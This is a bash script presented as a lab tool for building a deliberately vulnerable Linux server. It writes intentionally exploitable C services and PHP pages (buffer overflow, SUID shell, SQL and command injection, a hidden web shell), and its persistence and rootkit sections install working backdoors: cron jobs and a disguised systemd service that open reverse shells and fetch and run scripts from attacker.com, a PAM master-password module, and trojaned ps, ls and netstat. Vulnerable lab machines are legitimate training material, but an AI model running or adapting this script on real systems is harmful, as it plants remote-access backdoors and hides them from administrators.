#!/bin/bash
# Ultimate Vulnerable Server Creator
# Author: Q4n0 
# GitHub: https://github.com/q4n0
# Twitter: @byt3s3c
# Instagram: @onlybyhive

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Banner
show_banner() {
    clear
    cat << "EOF"
███████╗██╗██████╗ ███████╗███╗   ██╗
██╔════╝██║██╔══██╗██╔════╝████╗  ██║
███████╗██║██████╔╝█████╗  ██╔██╗ ██║
╚════██║██║██╔══██╗██╔══╝  ██║╚██╗██║
███████║██║██║  ██║███████╗██║ ╚████║
╚══════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝
   Vulnerable Server Creator v1.0
EOF
    echo -e "\n${BLUE}=== Created by Q4n0 ===${NC}"
    echo -e "${CYAN}GitHub: ${WHITE}https://github.com/q4n0${NC}"
    echo -e "${CYAN}Twitter: ${WHITE}@byt3s3c${NC}"
    echo -e "${CYAN}Instagram: ${WHITE}@onlybyhive${NC}"
    echo -e "${CYAN}Blog: ${WHITE}http://blog.q4n0.com/${NC}\n"
    echo -e "${RED}[!] WARNING: SIREN creates an EXTREMELY vulnerable system!${NC}"
    echo -e "${RED}[!] Use ONLY in isolated lab environments${NC}\n"
}

# Logger functions
log_status() { echo -e "${GREEN}[+] $1${NC}"; }
log_info() { echo -e "${BLUE}[*] $1${NC}"; }
log_warning() { echo -e "${RED}[!] $1${NC}"; }
log_prompt() { echo -e "${YELLOW}[?] $1${NC}"; }

# Check root
check_root() {
    if [ "$EUID" -ne 0 ]; then 
        log_warning "Please run as root"
        exit 1
    fi
}

# Configuration variables
declare -A CONFIG=(
    [KERNEL_VULNS]="true"
    [WEB_VULNS]="true"
    [DB_VULNS]="true"
    [NETWORK_VULNS]="true"
    [USER_VULNS]="true"
    [FILE_VULNS]="true"
    [SERVICE_VULNS]="true"
    [PERSISTENCE]="true"
    [ROOTKIT]="true"
    [ADVANCED_VULNS]="true"
)

# Configuration menu
configure_setup() {
    while true; do
        clear
        show_banner
        echo -e "${YELLOW}=== Configuration Menu ===${NC}\n"
        
        local count=1
        for key in "${!CONFIG[@]}"; do
            if [ "${CONFIG[$key]}" = "true" ]; then
                echo -e "${count}) ${GREEN}[✓] $key${NC}"
            else
                echo -e "${count}) ${RED}[✗] $key${NC}"
            fi
            ((count++))
        done
        
        echo -e "\n${WHITE}A) Enable All${NC}"
        echo -e "${WHITE}N) Disable All${NC}"
        echo -e "${WHITE}C) Continue Installation${NC}"
        echo -e "${WHITE}Q) Quit${NC}\n"
        
        log_prompt "Select an option [1-${#CONFIG[@]},A,N,C,Q]: "
        read -r choice
        
        case $choice in
            [1-9]|10)
                local idx=1
                for key in "${!CONFIG[@]}"; do
                    if [ "$idx" = "$choice" ]; then
                        CONFIG[$key]=$([ "${CONFIG[$key]}" = "true" ] && echo "false" || echo "true")
                        break
                    fi
                    ((idx++))
                done
                ;;
            [Aa]) for key in "${!CONFIG[@]}"; do CONFIG[$key]="true"; done ;;
            [Nn]) for key in "${!CONFIG[@]}"; do CONFIG[$key]="false"; done ;;
            [Cc]) return 0 ;;
            [Qq]) exit 0 ;;
            *) log_warning "Invalid option" ;;
        esac
    done
}

# Setup working directory
setup_workspace() {
    WORK_DIR="/tmp/vuln_setup_$$"
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR" || exit 1
    log_status "Created working directory: $WORK_DIR"
}

# System preparation
prepare_system() {
    log_status "Preparing system..."
    
    # Update and install required packages
    apt update
    apt install -y \
        build-essential \
        gcc \
        make \
        apache2 \
        php \
        mysql-server \
        openssh-server \
        vsftpd \
        curl \
        git \
        netcat \
        python3 \
        wget
}
# C code implementations
setup_c_vulnerabilities() {
    log_status "Setting up C-based vulnerabilities..."
    
    # Buffer Overflow Service
    cat > "$WORK_DIR/buffer_overflow.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

void handle_client(int sock) {
    char buffer[64];
    read(sock, buffer, 1024); // Buffer overflow vulnerability
    printf("Received: %s\n", buffer);
}

int main() {
    int server_sock, client_sock;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);

    server_sock = socket(AF_INET, SOCK_STREAM, 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    bind(server_sock, (struct sockaddr*)&server_addr, sizeof(server_addr));
    listen(server_sock, 5);

    while(1) {
        client_sock = accept(server_sock, (struct sockaddr*)&client_addr, &client_len);
        handle_client(client_sock);
        close(client_sock);
    }
    return 0;
}
EOF
    gcc "$WORK_DIR/buffer_overflow.c" -o /usr/local/bin/vuln_service -fno-stack-protector -z execstack
    chmod +x /usr/local/bin/vuln_service

    # SUID Binary
    cat > "$WORK_DIR/suid_binary.c" << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Usage: %s <command>\n", argv[0]);
        return 1;
    }
    setuid(0);
    system(argv[1]);
    return 0;
}
EOF
    gcc "$WORK_DIR/suid_binary.c" -o /usr/local/bin/suid_vuln
    chmod u+s /usr/local/bin/suid_vuln

    # Kernel Module
    cat > "$WORK_DIR/kernel_vuln.c" << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/string.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");

static struct proc_dir_entry *proc_entry;

static ssize_t proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) 
{
    char buf[1024];
    if(copy_from_user(buf, ubuf, count))
        return -EFAULT;
    return count;
}

static const struct file_operations proc_ops = {
    .write = proc_write,
};

static int __init vuln_module_init(void)
{
    proc_entry = proc_create("vuln_module", 0666, NULL, &proc_ops);
    return 0;
}

static void __exit vuln_module_cleanup(void)
{
    proc_remove(proc_entry);
}

module_init(vuln_module_init);
module_exit(vuln_module_cleanup);
EOF
}

# Web vulnerabilities setup
setup_web_vulnerabilities() {
    log_status "Setting up web vulnerabilities..."
    
    # SQL Injection
    cat > /var/www/html/login.php << 'EOF'
<?php
$conn = new mysqli('localhost', 'root', 'password123', 'vulndb');
if(isset($_POST['username']) && isset($_POST['password'])) {
    $query = "SELECT * FROM users WHERE username='" . $_POST['username'] . 
             "' AND password='" . $_POST['password'] . "'";
    $result = $conn->query($query);
    if($result->num_rows > 0) {
        echo "Login successful!";
    } else {
        echo "Login failed!";
    }
}
?>
<form method="POST">
Username: <input type="text" name="username"><br>
Password: <input type="password" name="password"><br>
<input type="submit" value="Login">
</form>
EOF

    # File Upload
    cat > /var/www/html/upload.php << 'EOF'
<?php
if(isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $name = $file['name'];
    move_uploaded_file($file['tmp_name'], "uploads/" . $name);
    echo "File uploaded successfully!";
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload">
</form>
EOF
    mkdir -p /var/www/html/uploads
    chmod 777 /var/www/html/uploads

    # Command Injection
    cat > /var/www/html/ping.php << 'EOF'
<?php
if(isset($_GET['host'])) {
    $host = $_GET['host'];
    $output = shell_exec("ping -c 4 " . $host);
    echo "<pre>$output</pre>";
}
?>
<form method="GET">
Host: <input type="text" name="host">
<input type="submit" value="Ping">
</form>
EOF

    # Backdoor
    cat > /var/www/html/.backdoor.php << 'EOF'
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
if(isset($_POST['upload'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" name="upload" value="Upload">
</form>
EOF

    # Directory listing vulnerability
    cat > /var/www/html/.htaccess << 'EOF'
Options +Indexes
EOF
}

# Database vulnerabilities setup
setup_database_vulnerabilities() {
    log_status "Setting up database vulnerabilities..."
    
    # Configure MySQL
    mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password123';"
    mysql -e "CREATE USER 'admin'@'%' IDENTIFIED BY 'admin123';"
    mysql -e "GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%' WITH GRANT OPTION;"
    mysql -e "FLUSH PRIVILEGES;"
    
    # Create vulnerable database
    mysql -e "CREATE DATABASE vulndb;"
    mysql vulndb -e "CREATE TABLE users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        username VARCHAR(50),
        password VARCHAR(50),
        credit_card VARCHAR(16),
        ssn VARCHAR(11)
    );"
    mysql vulndb -e "INSERT INTO users VALUES 
        (1, 'admin', 'admin123', '4111111111111111', '123-45-6789'),
        (2, 'john', 'password123', '4222222222222222', '987-65-4321');"
    
    # Configure MySQL for remote access
    sed -i 's/bind-address\s*=\s*127.0.0.1/bind-address = 0.0.0.0/' /etc/mysql/mysql.conf.d/mysqld.cnf
}

# Network service vulnerabilities setup
setup_network_vulnerabilities() {
    log_status "Setting up network service vulnerabilities..."
    
    # SSH Configuration
    cat > /etc/ssh/sshd_config << 'EOF'
Port 22
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords yes
UsePAM yes
UsePrivilegeSeparation no
StrictModes no
EOF
    systemctl restart ssh

    # FTP Configuration
    cat > /etc/vsftpd.conf << 'EOF'
listen=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
no_anon_password=YES
EOF
    systemctl restart vsftpd

    # Create NFS share with no_root_squash
    echo "/home *(rw,no_root_squash)" >> /etc/exports
    exportfs -a
}

# Persistence mechanisms setup
setup_persistence() {
    log_status "Setting up persistence mechanisms..."

    # Create backdoor user
    useradd -m -s /bin/bash backdoor
    echo "backdoor:password123" | chpasswd
    usermod -aG sudo backdoor

    # Setup cron jobs
    echo "* * * * * root nc -e /bin/bash attacker.com 4444" > /etc/cron.d/backdoor
    echo "*/5 * * * * root curl -s http://attacker.com/c2.sh | bash" > /etc/cron.d/update

    # Create systemd service
    cat > /etc/systemd/system/backdoor.service << 'EOF'
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do nc -e /bin/bash attacker.com 4445; sleep 60; done'
Restart=always

[Install]
WantedBy=multi-user.target
EOF
    systemctl enable backdoor.service
    systemctl start backdoor.service

    # Create PAM backdoor
    cat > /tmp/pam_backdoor.c << 'EOF'
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdio.h>
#include <string.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    const char *password;
    
    pam_get_user(pamh, &username, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    if(strcmp(password, "masterkey123") == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_IGNORE;
}
EOF
    gcc -fPIC -shared -o /lib/security/pam_backdoor.so /tmp/pam_backdoor.c
    echo "auth sufficient pam_backdoor.so" >> /etc/pam.d/common-auth
}

# Rootkit simulation setup
setup_rootkit() {
    log_status "Setting up rootkit simulation..."

    # Process hiding
    cat > /usr/local/bin/ps << 'EOF'
#!/bin/bash
/bin/ps $@ | grep -v "backdoor\|nc\|Evil"
EOF
    chmod +x /usr/local/bin/ps

    # File hiding
    cat > /usr/local/bin/ls << 'EOF'
#!/bin/bash
/bin/ls $@ | grep -v "\.backdoor\|\.hidden"
EOF
    chmod +x /usr/local/bin/ls

    # Network connection hiding
    cat > /usr/local/bin/netstat << 'EOF'
#!/bin/bash
/bin/netstat $@ | grep -v "4444\|4445"
EOF
    chmod +x /usr/local/bin/netstat
}

# Main setup function
setup_vulnerabilities() {
    for key in "${!CONFIG[@]}"; do
        if [ "${CONFIG[$key]}" = "true" ]; then
            case $key in
                KERNEL_VULNS) setup_c_vulnerabilities ;;
                WEB_VULNS) setup_web_vulnerabilities ;;
                DB_VULNS) setup_database_vulnerabilities ;;
                NETWORK_VULNS) setup_network_vulnerabilities ;;
                PERSISTENCE) setup_persistence ;;
                ROOTKIT) setup_rootkit ;;
            esac
        fi
    done
}

# Cleanup function
cleanup() {
    log_status "Cleaning up..."
    rm -rf "$WORK_DIR"
}

# Final configuration display
show_final_config() {
    echo -e "\n${YELLOW}=== System Information ===${NC}"
    echo -e "Web Interface: http://$(hostname -I | cut -d' ' -f1)/"
    echo -e "SSH: $(hostname -I | cut -d' ' -f1):22"
    echo -e "FTP: $(hostname -I | cut -d' ' -f1):21"
    echo -e "Buffer Overflow Service: $(hostname -I | cut -d' ' -f1):4444"
    
    echo -e "\n${YELLOW}=== Credentials ===${NC}"
    echo -e "MySQL Root: root:password123"
    echo -e "MySQL Admin: admin:admin123"
    echo -e "SSH Backdoor: backdoor:password123"
    echo -e "Web Admin: admin:admin123"
    
    echo -e "\n${RED}[!] WARNING: System is now extremely vulnerable!${NC}"
    echo -e "${RED}[!] Use only in isolated lab environments${NC}"
}

# Main function
main() {
    check_root
    show_banner
    configure_setup
    setup_workspace
    prepare_system
    setup_vulnerabilities
    show_final_config
    cleanup
}

# Execute main function
main
